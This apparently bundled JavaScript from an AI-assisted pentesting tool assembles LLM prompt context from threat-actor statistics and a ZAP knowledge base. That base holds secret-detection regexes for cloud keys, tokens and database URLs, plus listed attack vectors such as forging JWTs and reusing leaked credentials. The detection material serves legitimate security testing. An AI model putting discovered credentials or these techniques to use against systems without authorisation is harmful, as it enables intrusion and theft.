import {
  buildMissedVulnAttackContext,
  buildMissedVulnContext,
  init_missed_vuln_training_knowledge
} from "./chunk-5DEWV7VV.js";
import {
  buildCloudSecurityContext,
  buildGeneralCloudContext,
  detectCloudProviders,
  formatChainsForPrompt,
  getBugBountyContext,
  getChainsByVulnDescriptions,
  getTrainingExamplesForPrompt,
  getTriageCorpusContext,
  getTriageSystemPrompt,
  init_attack_chain_retriever,
  init_bugbounty_knowledge,
  init_cloud_security_knowledge,
  init_training_corpus
} from "./chunk-N4SKBCBX.js";
import {
  buildOffensiveTechniquesContext,
  getFileUploadBypassContext,
  getFirewallEvasionContext,
  getLOTLContext,
  getShodanReconContext,
  getSubdomainEnumContext,
  init_offensive_techniques_knowledge
} from "./chunk-YY5JEKDP.js";
import {
  getLearningDashboard,
  getThreatStats,
  getThreatTrend,
  init_learning_engine_api,
  scoreThreatAttribution
} from "./chunk-Z63B6QCQ.js";
import {
  formatOntologyForPrompt,
  inferAssetContext,
  init_asset_ontology
} from "./chunk-NQKLH74H.js";
import {
  buildZAPKnowledgeContext,
  getTechScanPolicyContext,
  getVulnPayloadContext,
  getZAPAlertCatalogContext,
  getZAPAuthContext,
  getZAPReasoningPrompt,
  init_zap_pentesting_knowledge
} from "./chunk-E7WGGYZE.js";
import {
  buildAttackPlannerToolContext,
  buildToolRecommendationContext,
  init_offensive_tools_knowledge
} from "./chunk-SSYKZXNO.js";
import {
  buildMethodologyContext,
  buildPhaseToolContext,
  buildScanPlanningContext,
  buildVulnTestingContext,
  init_bugbounty_methodology_knowledge
} from "./chunk-WP62CKNZ.js";
import {
  buildOptimalScanforgeCommand,
  getFullScanforgeContext,
  getScanforgeHuntContext,
  getScanforgeScanPlanContext,
  getScanforgeVulnCorrelationContext,
  init_scanforge_knowledge
} from "./chunk-LPSC3SDV.js";
import {
  getOwaspAssetClassificationContext,
  getOwaspScanPlanContext,
  getOwaspVulnCorrelationContext,
  init_owasp_knowledge
} from "./chunk-J6EMIQSU.js";
import {
  getGroupsByCVE,
  getSectorThreatContext,
  getThreatGroupScanContext,
  getThreatGroupVulnContext,
  init_threat_group_knowledge
} from "./chunk-RXZBKY45.js";
import {
  init_knowledge_loader,
  loadKnowledgeData
} from "./chunk-PIYDKQBM.js";
import {
  calculateKevRiskBoost,
  fetchKevCatalog,
  init_kev_service,
  matchCvesAgainstKev
} from "./chunk-PFTNS476.js";
import {
  __esm
} from "./chunk-KFQGP6VL.js";

// server/lib/threat-actor-learning-context.ts
async function fetchThreatLearningData() {
  const now = Date.now();
  if (_cachedContext && now - _cacheTimestamp < CACHE_TTL_MS) {
    return _cachedContext;
  }
  try {
    const [statsResult, trendResult, dashboardResult] = await Promise.allSettled([
      getThreatStats(),
      getThreatTrend(10),
      getLearningDashboard()
    ]);
    const stats = statsResult.status === "fulfilled" ? statsResult.value : null;
    const trend = trendResult.status === "fulfilled" ? trendResult.value : null;
    const dashboard = dashboardResult.status === "fulfilled" ? dashboardResult.value : null;
    const ctx = {
      topGroups: stats?.topGroups || [],
      topTechniques: (stats?.topTechniques || []).map((t) => ({
        techniqueId: t.technique_id || t.techniqueId || "",
        techniqueName: t.technique_name || t.techniqueName || "",
        detections: t.detections ?? 0
      })),
      topCVEs: (stats?.topCVEs || []).map((c) => ({
        cve: c.cve || c.cve_id || "",
        detections: c.detections ?? 0
      })),
      catalogSummary: {
        totalGroups: dashboard?.threatActor?.totalGroups ?? stats?.catalogSummary?.totalGroups ?? 0,
        totalTTPs: dashboard?.threatActor?.totalTTPs ?? stats?.catalogSummary?.totalTTPs ?? 0,
        totalCVEs: dashboard?.threatActor?.totalCVEs ?? stats?.catalogSummary?.totalCVEs ?? 0
      },
      recentTrend: trend?.trend || []
    };
    _cachedContext = ctx;
    _cacheTimestamp = now;
    console.log(`${LOG} Fetched threat learning data: ${ctx.topGroups.length} groups, ${ctx.topTechniques.length} techniques`);
    return ctx;
  } catch (err) {
    console.warn(`${LOG} Failed to fetch threat learning data: ${err.message}`);
    return _cachedContext;
  }
}
async function buildThreatActorLearningContext() {
  const data = await fetchThreatLearningData();
  if (!data || data.topGroups.length === 0 && data.topTechniques.length === 0) {
    return "";
  }
  let ctx = `
=== THREAT ACTOR LEARNING ENGINE \u2014 LIVE ATTRIBUTION DATA ===
`;
  ctx += `The learning engine has analyzed scans against ${data.catalogSummary.totalGroups} threat groups, `;
  ctx += `${data.catalogSummary.totalTTPs} TTPs, and ${data.catalogSummary.totalCVEs} CVEs.

`;
  if (data.topGroups.length > 0) {
    ctx += `TOP THREAT GROUPS BY DETECTION FREQUENCY:
`;
    for (const g of data.topGroups.slice(0, 10)) {
      ctx += `  - ${g.groupName} (${g.matchCount} matches, ${Math.round(g.avgConfidence)}% avg confidence)
`;
    }
    ctx += `
`;
  }
  if (data.topTechniques.length > 0) {
    ctx += `MOST FREQUENTLY DETECTED TECHNIQUES:
`;
    for (const t of data.topTechniques.slice(0, 10)) {
      ctx += `  - ${t.techniqueId} ${t.techniqueName} (${t.detections} detections)
`;
    }
    ctx += `
`;
  }
  if (data.topCVEs.length > 0) {
    ctx += `MOST FREQUENTLY DETECTED CVEs:
`;
    for (const c of data.topCVEs.slice(0, 10)) {
      ctx += `  - ${c.cve} (${c.detections} detections)
`;
    }
    ctx += `
`;
  }
  if (data.recentTrend.length > 0) {
    ctx += `RECENT ATTRIBUTION TREND:
`;
    for (const t of data.recentTrend.slice(0, 5)) {
      ctx += `  - ${t.topGroup}: ${t.ttpsMatched} TTPs, ${t.cvesMatched} CVEs, ${Math.round(t.confidence)}% confidence
`;
    }
    ctx += `
`;
  }
  ctx += `INSTRUCTIONS: Use this live threat attribution data to prioritize scanning for techniques and CVEs `;
  ctx += `associated with the most frequently detected threat groups. If the target's technology stack matches `;
  ctx += `patterns associated with specific groups, escalate those checks. Cross-reference findings against the `;
  ctx += `top CVEs list to identify high-confidence threat actor overlap.
`;
  return ctx;
}
async function buildThreatActorVulnContext(discoveredCVEs, discoveredTechniques) {
  const data = await fetchThreatLearningData();
  if (!data || data.topGroups.length === 0) {
    return "";
  }
  let ctx = `
=== THREAT ACTOR CORRELATION \u2014 LIVE LEARNING DATA ===
`;
  const matchedCVEs = discoveredCVEs.filter(
    (cve) => data.topCVEs.some((tc) => tc.cve === cve)
  );
  if (matchedCVEs.length > 0) {
    ctx += `DISCOVERED CVEs MATCHING THREAT ACTOR PATTERNS:
`;
    for (const cve of matchedCVEs) {
      const match = data.topCVEs.find((tc) => tc.cve === cve);
      ctx += `  - ${cve} (detected ${match?.detections ?? 0} times in threat actor scans)
`;
    }
    ctx += `  \u2192 These CVEs are actively exploited by known threat groups. BOOST severity.

`;
  }
  const matchedTechs = discoveredTechniques.filter(
    (tech) => data.topTechniques.some(
      (tt) => tt.techniqueId === tech || tt.techniqueName.toLowerCase().includes(tech.toLowerCase())
    )
  );
  if (matchedTechs.length > 0) {
    ctx += `DISCOVERED TECHNIQUES MATCHING THREAT ACTOR PATTERNS:
`;
    for (const tech of matchedTechs) {
      const match = data.topTechniques.find(
        (tt) => tt.techniqueId === tech || tt.techniqueName.toLowerCase().includes(tech.toLowerCase())
      );
      ctx += `  - ${tech} \u2192 ${match?.techniqueName || tech} (${match?.detections ?? 0} detections)
`;
    }
    ctx += `  \u2192 These techniques are commonly used by tracked threat groups. Flag for further investigation.

`;
  }
  ctx += `TOP THREAT GROUPS TO CORRELATE AGAINST:
`;
  for (const g of data.topGroups.slice(0, 5)) {
    ctx += `  - ${g.groupName}: ${g.matchCount} matches, ${Math.round(g.avgConfidence)}% confidence
`;
  }
  return ctx;
}
async function scoreEngagementThreatAttribution(opts) {
  try {
    const result = await scoreThreatAttribution({
      sessionId: opts.sessionId,
      engagementId: opts.engagementId,
      targetUrl: opts.targetUrl,
      scanType: "engagement",
      ttps: opts.ttps,
      cves: opts.cves
    });
    console.log(`${LOG} Scored threat attribution for engagement ${opts.engagementId}: ${JSON.stringify(result?.summary || {})}`);
    _cachedContext = null;
    _cacheTimestamp = 0;
    return result;
  } catch (err) {
    console.warn(`${LOG} Failed to score threat attribution: ${err.message}`);
    return null;
  }
}
function clearThreatLearningCache() {
  _cachedContext = null;
  _cacheTimestamp = 0;
}
var LOG, _cachedContext, _cacheTimestamp, CACHE_TTL_MS;
var init_threat_actor_learning_context = __esm({
  "server/lib/threat-actor-learning-context.ts"() {
    "use strict";
    init_learning_engine_api();
    LOG = "[ThreatActorLearning]";
    _cachedContext = null;
    _cacheTimestamp = 0;
    CACHE_TTL_MS = 5 * 60 * 1e3;
  }
});

// server/lib/knowledge/zap-source-secrets-knowledge.ts
function buildSourceSecretsContext(params) {
  const sections = [];
  sections.push(buildRuleCatalogSection());
  if (params.includeSecretPatterns !== false && (params.phase === "vuln_detection" || params.phase === "exploitation" || params.phase === "enumeration")) {
    sections.push(buildSecretPatternsSection(params.technology));
  }
  if (params.includeJSAnalysis !== false && (params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildJSAnalysisSection());
  }
  if (params.includeSourceDisclosure !== false && (params.phase === "enumeration" || params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildSourceDisclosureSection());
  }
  if (params.includeBrowserStorage !== false && (params.phase === "vuln_detection" || params.phase === "exploitation")) {
    sections.push(buildBrowserStorageSection());
  }
  if (sections.length === 0) return "";
  return `# ZAP Source Code & Secrets Analysis Knowledge

${sections.join("\n\n---\n\n")}`;
}
function buildRuleCatalogSection() {
  const allRules = [
    ...ZAP_SOURCE_SECRET_RULES.sourceCodeDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.scriptAnalysis,
    ...ZAP_SOURCE_SECRET_RULES.secretsDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.fileDisclosure,
    ...ZAP_SOURCE_SECRET_RULES.cloudSecrets,
    ...ZAP_SOURCE_SECRET_RULES.browserStorage,
    ...ZAP_SOURCE_SECRET_RULES.debugDisclosure
  ];
  const passive = allRules.filter((r) => r.type === "passive");
  const active = allRules.filter((r) => r.type === "active");
  return `## ZAP Rules for Source Code & Secret Detection

### Passive Rules (run automatically during spidering)
${passive.map((r) => `- **${r.ruleId}**: ${r.name} [${r.risk}]`).join("\n")}

### Active Rules (require active scan)
${active.map((r) => `- **${r.ruleId}**: ${r.name} [${r.risk}]`).join("\n")}

**Configuration**: Enable ALL passive rules at LOW threshold for maximum coverage. For active rules, set source code disclosure rules (41, 42, 43, 10045) to HIGH strength and file disclosure rules (40034, 40035, 10095) to MEDIUM strength.`;
}
function buildSecretPatternsSection(technology) {
  let patterns = SECRET_PATTERNS;
  if (technology) {
    const techLower = technology.toLowerCase();
    const prioritized = patterns.filter((p) => {
      if (techLower.includes("aws") || techLower.includes("amazon")) return p.category === "cloud";
      if (techLower.includes("node") || techLower.includes("react")) return ["api_key", "token", "database"].includes(p.category);
      if (techLower.includes("java") || techLower.includes("spring")) return ["database", "cloud", "encryption"].includes(p.category);
      return true;
    });
    if (prioritized.length > 0) patterns = [...prioritized, ...patterns.filter((p) => !prioritized.includes(p))];
  }
  return `## Secret Detection Patterns

When analyzing JavaScript files, HTML source, and API responses, search for these patterns:

${patterns.map((p) => `### ${p.name} [${p.severity.toUpperCase()}]
- **Pattern**: \`${p.regex}\`
- **Category**: ${p.category}
- **FP Rate**: ${p.falsePositiveRate}
- **What it means**: ${p.description}
- **Remediation**: ${p.remediation}
- **Example**: \`${p.examples[0]}\``).join("\n\n")}

**Search Strategy**: After spidering, use ZAP's Search tab to grep ALL responses for each pattern. Focus on JavaScript files, JSON responses, and HTML inline scripts.`;
}
function buildJSAnalysisSection() {
  return `## JavaScript Source Code Analysis Techniques

${JS_ANALYSIS_TECHNIQUES.map((t) => `### ${t.name}
${t.description}

**ZAP Rules**: ${t.zapRuleIds.join(", ")}

**Steps**:
${t.manualSteps.map((s, i) => `${i + 1}. ${s}`).join("\n")}

**What to look for**:
${t.whatToLookFor.map((w) => `- ${w}`).join("\n")}

**Attack vectors**:
${t.attackVectors.map((a) => `- ${a}`).join("\n")}`).join("\n\n---\n\n")}`;
}
function buildSourceDisclosureSection() {
  return `## Source Code Disclosure Vectors

${SOURCE_CODE_DISCLOSURE_VECTORS.map((v) => `### ${v.name}
**ZAP Rules**: ${v.zapRuleIds.join(", ")}
**Probe Paths**: ${v.paths.slice(0, 4).join(", ")}
**Indicators**: ${v.indicators.join(", ")}
**Exploitability**: ${v.exploitability}
**Post-Exploitation**:
${v.postExploitation.map((p) => `- ${p}`).join("\n")}`).join("\n\n")}`;
}
function buildBrowserStorageSection() {
  return `## Browser Storage Security Audit

Use ZAP Ajax Spider (browser-based crawling) to trigger JavaScript that populates browser storage, then analyze:

${BROWSER_STORAGE_CHECKS.map((c) => `### ${c.storageType}
**ZAP Rules**: ${c.zapRuleIds.join(", ")}
**Risk**: ${c.description}
**Sensitive Keys to Check**: ${c.sensitiveKeys.join(", ")}
**Extraction**: \`${c.extractionMethod}\``).join("\n\n")}

**IMPORTANT**: Browser storage analysis requires the Ajax Spider (browser-based crawling) to be enabled. Standard spider does not execute JavaScript and will miss storage-based secrets.`;
}
function buildCompactSourceSecretsContext() {
  const criticalPatterns = SECRET_PATTERNS.filter((p) => p.severity === "critical");
  const highPatterns = SECRET_PATTERNS.filter((p) => p.severity === "high").slice(0, 5);
  return `## Source Code & Secrets Quick Reference

### Critical Secret Patterns to Search For:
${[...criticalPatterns, ...highPatterns].map((p) => `- ${p.name}: \`${p.regex}\` [${p.severity}]`).join("\n")}

### ZAP Configuration for Secret Detection:
1. Enable passive rules: 10025 (Suspicious Comments), 10094 (Base64), 100034 (Google API Key), 120001 (Browser Storage Secrets)
2. Enable active rules: 40034 (.env), 40035 (Hidden Files), 42 (Git), 10045 (WEB-INF), 10095 (Backup Files)
3. Spider config: parseComments=true, parseGit=true, parseSVNEntries=true
4. Use Ajax Spider for browser storage analysis
5. After spidering: Search all responses for secret patterns listed above

### Key JS Analysis Points:
- Check source maps (.map files) for original source code
- Search webpack/vite bundles for hardcoded secrets
- Analyze localStorage/sessionStorage for JWT tokens and API keys
- Check inline <script> blocks for config objects with credentials
- Review postMessage handlers for missing origin validation`;
}
var ZAP_SOURCE_SECRET_RULES, SECRET_PATTERNS, JS_ANALYSIS_TECHNIQUES, SOURCE_CODE_DISCLOSURE_VECTORS, BROWSER_STORAGE_CHECKS;
var init_zap_source_secrets_knowledge = __esm({
  "server/lib/knowledge/zap-source-secrets-knowledge.ts"() {
    "use strict";
    ZAP_SOURCE_SECRET_RULES = {
      // Source Code Disclosure
      sourceCodeDisclosure: [
        { ruleId: 41, name: "Source Code Disclosure - SVN", risk: "Medium", type: "active" },
        { ruleId: 42, name: "Source Code Disclosure - Git", risk: "Medium", type: "active" },
        { ruleId: 43, name: "Source Code Disclosure - File Inclusion", risk: "High", type: "active" },
        { ruleId: 10045, name: "Source Code Disclosure - /WEB-INF", risk: "High", type: "active" },
        { ruleId: 10099, name: "Source Code Disclosure - PHP", risk: "Medium", type: "active" },
        { ruleId: 20017, name: "Source Code Disclosure - CVE-2012-1823", risk: "High", type: "active" }
      ],
      // JavaScript & Script Analysis
      scriptAnalysis: [
        { ruleId: 10055, name: "CSP: script-src unsafe-inline", risk: "Medium", type: "passive" },
        { ruleId: 10115, name: "Script Served From Malicious Domain", risk: "High", type: "passive" },
        { ruleId: 40026, name: "Cross Site Scripting (DOM Based)", risk: "High", type: "active" },
        { ruleId: 90003, name: "Sub Resource Integrity Missing", risk: "Medium", type: "passive" },
        { ruleId: 10025, name: "Suspicious Comments in Source", risk: "Informational", type: "passive" }
      ],
      // Secrets & Credential Disclosure
      secretsDisclosure: [
        { ruleId: 10105, name: "Authentication Credentials Captured", risk: "High", type: "passive" },
        { ruleId: 10057, name: "Username Hash Found", risk: "Informational", type: "passive" },
        { ruleId: 10097, name: "Hash Disclosure - MD4/MD5", risk: "Medium", type: "passive" },
        { ruleId: 10094, name: "Base64 Disclosure", risk: "Informational", type: "passive" },
        { ruleId: 10062, name: "PII Disclosure", risk: "High", type: "passive" },
        { ruleId: 100034, name: "Google API Key Disclosure", risk: "Medium", type: "passive" },
        { ruleId: 100043, name: "Swagger UI Secret Detector", risk: "High", type: "passive" }
      ],
      // File & Backup Disclosure
      fileDisclosure: [
        { ruleId: 40034, name: ".env Information Leak", risk: "High", type: "active" },
        { ruleId: 40032, name: ".htaccess Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40035, name: "Hidden File Found", risk: "Medium", type: "active" },
        { ruleId: 10095, name: "Backup File Disclosure", risk: "Medium", type: "active" },
        { ruleId: 40028, name: "ELMAH Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40029, name: "Trace.axd Information Leak", risk: "Medium", type: "active" },
        { ruleId: 40042, name: "Spring Actuator Information Leak", risk: "High", type: "active" }
      ],
      // Cloud & Infrastructure
      cloudSecrets: [
        { ruleId: 90034, name: "Cloud Metadata Exposed", risk: "High", type: "active" },
        { ruleId: 100036, name: "Amazon S3 Bucket URL Disclosure", risk: "Medium", type: "passive" }
      ],
      // Browser Storage Analysis
      browserStorage: [
        { ruleId: 12e4, name: "Information in Browser Storage", risk: "Medium", type: "passive" },
        { ruleId: 120001, name: "Sensitive Information in Browser Storage", risk: "High", type: "passive" },
        { ruleId: 120002, name: "JWT in Browser Storage", risk: "High", type: "passive" }
      ],
      // Debug & Error Disclosure
      debugDisclosure: [
        { ruleId: 10042, name: "Debug Error Messages", risk: "Medium", type: "passive" },
        { ruleId: 10056, name: "X-Debug-Token Information Leak", risk: "Low", type: "passive" },
        { ruleId: 10052, name: "X-ChromeLogger-Data Header Leak", risk: "Medium", type: "passive" },
        { ruleId: 90022, name: "Application Error Disclosure", risk: "Medium", type: "passive" }
      ]
    };
    SECRET_PATTERNS = [
      {
        id: "aws-access-key",
        name: "AWS Access Key ID",
        category: "cloud",
        regex: "AKIA[0-9A-Z]{16}",
        description: "AWS IAM access key that grants programmatic access to AWS services",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate the key immediately via AWS IAM console, check CloudTrail for unauthorized usage",
        examples: ["AKIAIOSFODNN7EXAMPLE"]
      },
      {
        id: "aws-secret-key",
        name: "AWS Secret Access Key",
        category: "cloud",
        regex: `['"][0-9a-zA-Z/+]{40}['"]`,
        description: "AWS secret key paired with access key ID for authentication",
        severity: "critical",
        falsePositiveRate: "medium",
        remediation: "Rotate both access key and secret key, audit CloudTrail logs",
        examples: ["wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]
      },
      {
        id: "gcp-api-key",
        name: "Google Cloud API Key",
        category: "cloud",
        regex: "AIza[0-9A-Za-z_-]{35}",
        description: "Google Cloud Platform API key for service authentication",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Restrict API key scope, rotate via GCP console, add HTTP referrer restrictions",
        examples: ["AIzaSyA1234567890abcdefghijklmnopqrstuvw"]
      },
      {
        id: "github-token",
        name: "GitHub Personal Access Token",
        category: "token",
        regex: "gh[pousr]_[A-Za-z0-9_]{36,255}",
        description: "GitHub PAT granting repository and organization access",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Revoke token at github.com/settings/tokens, audit repository access logs",
        examples: ["ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh"]
      },
      {
        id: "slack-token",
        name: "Slack Bot/User Token",
        category: "token",
        regex: "xox[bporas]-[0-9]{10,13}-[0-9]{10,13}-[a-zA-Z0-9]{24,34}",
        description: "Slack API token for bot or user workspace access",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke token in Slack admin, rotate bot credentials",
        examples: ["xoxb-1234567890-1234567890-AbCdEfGhIjKlMnOpQrStUvWx"]
      },
      {
        id: "stripe-secret",
        name: "Stripe Secret Key",
        category: "api_key",
        regex: "sk_(live|test)_[0-9a-zA-Z]{24,99}",
        description: "Stripe payment processing secret key \u2014 allows charges and refunds",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Roll the key in Stripe Dashboard immediately, audit recent transactions",
        examples: ["sk_live_4eC39HqLyjWDarjtT1zdp7dc"]
      },
      {
        id: "stripe-publishable",
        name: "Stripe Publishable Key",
        category: "api_key",
        regex: "pk_(live|test)_[0-9a-zA-Z]{24,99}",
        description: "Stripe publishable key \u2014 lower risk but reveals account info",
        severity: "low",
        falsePositiveRate: "low",
        remediation: "Verify it's only used client-side; roll if paired with exposed secret key",
        examples: ["pk_live_4eC39HqLyjWDarjtT1zdp7dc"]
      },
      {
        id: "jwt-secret",
        name: "JWT Secret / Signing Key",
        category: "encryption",
        regex: `(?:jwt[_-]?secret|JWT_SECRET|jwt[_-]?key)\\s*[:=]\\s*['"][^'"]{8,}['"]`,
        description: "JWT signing secret allows forging authentication tokens",
        severity: "critical",
        falsePositiveRate: "medium",
        remediation: "Rotate the JWT secret, invalidate all existing sessions, move to env vars",
        examples: ["JWT_SECRET='my-super-secret-key-2024'"]
      },
      {
        id: "database-url",
        name: "Database Connection String",
        category: "database",
        regex: `(?:mysql|postgres|mongodb|redis|mssql)://[^\\s'"]+:[^\\s'"]+@[^\\s'"]+`,
        description: "Database connection URI with embedded credentials",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate database password, restrict network access, move to env vars",
        examples: ["postgres://admin:password123@db.example.com:5432/production"]
      },
      {
        id: "private-key",
        name: "Private Key (RSA/EC/SSH)",
        category: "encryption",
        regex: "-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
        description: "Cryptographic private key for TLS, SSH, or code signing",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Revoke and regenerate the key pair, update all services using it",
        examples: ["-----BEGIN RSA PRIVATE KEY-----"]
      },
      {
        id: "sendgrid-key",
        name: "SendGrid API Key",
        category: "api_key",
        regex: "SG\\.[a-zA-Z0-9_-]{22}\\.[a-zA-Z0-9_-]{43}",
        description: "SendGrid email service API key",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke in SendGrid dashboard, create new restricted key",
        examples: ["SG.abcdefghijklmnopqrstuv.wxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ12345"]
      },
      {
        id: "twilio-key",
        name: "Twilio API Key",
        category: "api_key",
        regex: "SK[0-9a-fA-F]{32}",
        description: "Twilio API key for SMS/voice services",
        severity: "high",
        falsePositiveRate: "medium",
        remediation: "Delete the API key in Twilio console, create new one",
        examples: ["SK1234567890abcdef1234567890abcdef"]
      },
      {
        id: "firebase-config",
        name: "Firebase Configuration",
        category: "cloud",
        regex: `(?:apiKey|authDomain|databaseURL|storageBucket)\\s*:\\s*['"][^'"]+['"]`,
        description: "Firebase project configuration \u2014 may expose project details and enable abuse",
        severity: "medium",
        falsePositiveRate: "high",
        remediation: "Restrict Firebase security rules, add domain restrictions to API key",
        examples: ["apiKey: 'AIzaSyA1234567890'"]
      },
      {
        id: "hardcoded-password",
        name: "Hardcoded Password",
        category: "credential",
        regex: `(?:password|passwd|pwd|secret)\\s*[:=]\\s*['"][^'"]{4,}['"]`,
        description: "Hardcoded password in source code or configuration",
        severity: "high",
        falsePositiveRate: "high",
        remediation: "Remove hardcoded password, use environment variables or secret manager",
        examples: ["password = 'admin123'", "const pwd = 'supersecret'"]
      },
      {
        id: "bearer-token",
        name: "Bearer/Authorization Token",
        category: "token",
        regex: "(?:Bearer|Authorization)\\s+[A-Za-z0-9_-]{20,}",
        description: "Authorization bearer token in source code or response headers",
        severity: "high",
        falsePositiveRate: "medium",
        remediation: "Revoke the token, implement token rotation, use short-lived tokens",
        examples: ["Authorization: Bearer eyJhbGciOiJIUzI1NiIs..."]
      },
      {
        id: "mailgun-key",
        name: "Mailgun API Key",
        category: "api_key",
        regex: "key-[0-9a-zA-Z]{32}",
        description: "Mailgun email service API key",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Rotate key in Mailgun dashboard",
        examples: ["key-1234567890abcdef1234567890abcdef"]
      },
      {
        id: "azure-connection",
        name: "Azure Connection String",
        category: "cloud",
        regex: "DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+",
        description: "Azure Storage account connection string with embedded key",
        severity: "critical",
        falsePositiveRate: "low",
        remediation: "Rotate storage account keys in Azure portal, use managed identity instead",
        examples: ["DefaultEndpointsProtocol=https;AccountName=myaccount;AccountKey=abc123..."]
      },
      {
        id: "openai-key",
        name: "OpenAI API Key",
        category: "api_key",
        regex: "sk-[a-zA-Z0-9]{20,}T3BlbkFJ[a-zA-Z0-9]{20,}",
        description: "OpenAI API key for GPT/DALL-E/Whisper services",
        severity: "high",
        falsePositiveRate: "low",
        remediation: "Revoke at platform.openai.com, create new key with usage limits",
        examples: ["sk-abc123...T3BlbkFJ...xyz789"]
      },
      {
        id: "internal-ip",
        name: "Internal/Private IP Address",
        category: "internal",
        regex: "(?:10\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}|172\\.(?:1[6-9]|2\\d|3[01])\\.\\d{1,3}\\.\\d{1,3}|192\\.168\\.\\d{1,3}\\.\\d{1,3})",
        description: "Internal network IP address leaked in response \u2014 reveals network topology",
        severity: "low",
        falsePositiveRate: "medium",
        remediation: "Configure server to strip internal IPs from responses and error messages",
        examples: ["10.0.1.42", "192.168.1.100"]
      }
    ];
    JS_ANALYSIS_TECHNIQUES = [
      {
        id: "inline-secrets",
        name: "Inline Secret Detection in JavaScript",
        description: "Scan JavaScript files and inline <script> blocks for hardcoded API keys, tokens, passwords, and connection strings. Modern SPAs often bundle configuration objects containing secrets that should be server-side only.",
        zapRuleIds: [10025, 10094, 100034, 100043],
        manualSteps: [
          "Spider the target with parseComments=true and parseGit=true to discover all JS files",
          "Use ZAP's Search feature to grep all responses for secret patterns (AKIA, sk_, ghp_, etc.)",
          "Check inline <script> tags in HTML responses for config objects with API keys",
          "Inspect webpack/vite chunk files \u2014 secrets often end up in vendor bundles",
          "Check source maps (.map files) which may contain original source with comments and secrets",
          "Review window.__CONFIG__ or similar global config injections"
        ],
        whatToLookFor: [
          "API keys: AWS (AKIA...), GCP (AIza...), Stripe (sk_live/pk_live), SendGrid (SG.)",
          "OAuth secrets: client_secret, client_id paired with secret values",
          "Database URLs: mongodb://, postgres://, mysql:// with credentials",
          "JWT secrets: jwt_secret, JWT_KEY, signing_key assignments",
          "Firebase config objects with apiKey, authDomain, databaseURL",
          "Environment variable leaks: process.env references that got bundled",
          "Hardcoded Bearer tokens in fetch/axios interceptors",
          "Base64-encoded credentials in Authorization headers"
        ],
        attackVectors: [
          "Use discovered API keys to access cloud services (S3, GCP Storage, etc.)",
          "Use database connection strings for direct database access",
          "Forge JWT tokens using discovered signing secrets",
          "Access internal APIs using discovered bearer tokens",
          "Enumerate cloud resources using leaked account identifiers"
        ],
        tools: ["ZAP Spider", "ZAP Ajax Spider", "ZAP Search", "ZAP Passive Scanner", "JS Beautifier"]
      },
      {
        id: "source-map-analysis",
        name: "Source Map Exploitation",
        description: "Modern JavaScript bundlers (webpack, vite, rollup) generate .map files that contain the original source code. If these are accessible in production, attackers can reconstruct the entire frontend codebase including comments, variable names, and potentially secrets.",
        zapRuleIds: [10025, 10094],
        manualSteps: [
          "Check for sourceMappingURL comments in JS files: //# sourceMappingURL=...",
          "Try appending .map to discovered JS file URLs",
          "Check common paths: /static/js/*.map, /assets/*.map, /_next/static/*.map",
          "Parse source maps to extract original file tree and source code",
          "Search extracted source for secrets, internal URLs, and API endpoints",
          "Look for development comments (TODO, FIXME, HACK, XXX) with sensitive context"
        ],
        whatToLookFor: [
          "Original TypeScript/JSX source with developer comments",
          "Internal API endpoint URLs and service architecture",
          "Environment variable references that reveal configuration",
          "Authentication logic and token handling patterns",
          "Admin routes and hidden functionality",
          "Database query patterns and ORM model definitions"
        ],
        attackVectors: [
          "Reconstruct full application logic to find business logic flaws",
          "Discover hidden admin endpoints and API routes",
          "Find authentication bypass patterns in original source",
          "Map internal microservice architecture from import paths"
        ],
        tools: ["ZAP Spider", "source-map-explorer", "unwebpack-sourcemap"]
      },
      {
        id: "dom-based-analysis",
        name: "DOM-Based Vulnerability Analysis",
        description: "Analyze JavaScript for DOM-based vulnerabilities where user input flows from sources (location.hash, document.referrer, postMessage) to sinks (innerHTML, eval, document.write) without sanitization.",
        zapRuleIds: [40026, 10055],
        manualSteps: [
          "Use ZAP Ajax Spider with browser-based crawling to execute JavaScript",
          "Enable DOM XSS passive scan rule (40026) for automated detection",
          "Check for unsafe CSP directives: unsafe-inline, unsafe-eval",
          "Review JavaScript for dangerous sink functions: eval(), innerHTML, document.write()",
          "Trace data flow from URL parameters/fragments to DOM manipulation",
          "Check postMessage handlers for missing origin validation"
        ],
        whatToLookFor: [
          "document.location.hash used directly in DOM operations",
          "URL parameters reflected into innerHTML or outerHTML",
          "eval() or Function() called with user-controllable input",
          "jQuery .html() or .append() with unsanitized data",
          "postMessage event handlers without origin checks",
          "Angular/React dangerouslySetInnerHTML with dynamic content",
          "Template literal injection in framework templates"
        ],
        attackVectors: [
          "DOM XSS via URL fragment injection",
          "Prototype pollution via __proto__ or constructor.prototype",
          "Client-side template injection in Angular/Vue",
          "postMessage-based XSS from cross-origin frames",
          "Open redirect via client-side routing manipulation"
        ],
        tools: ["ZAP Ajax Spider", "ZAP DOM XSS Scanner", "Browser DevTools"]
      },
      {
        id: "browser-storage-audit",
        name: "Browser Storage Secret Audit",
        description: "Analyze localStorage, sessionStorage, cookies, and IndexedDB for sensitive data that should not be stored client-side. Many SPAs store JWTs, API keys, or PII in browser storage where they're vulnerable to XSS extraction.",
        zapRuleIds: [12e4, 120001, 120002],
        manualSteps: [
          "Use ZAP Ajax Spider (browser-based) to trigger JavaScript that populates storage",
          "Enable Browser Storage passive scan rules (120000-120002)",
          "Check localStorage for JWT tokens, API keys, and session data",
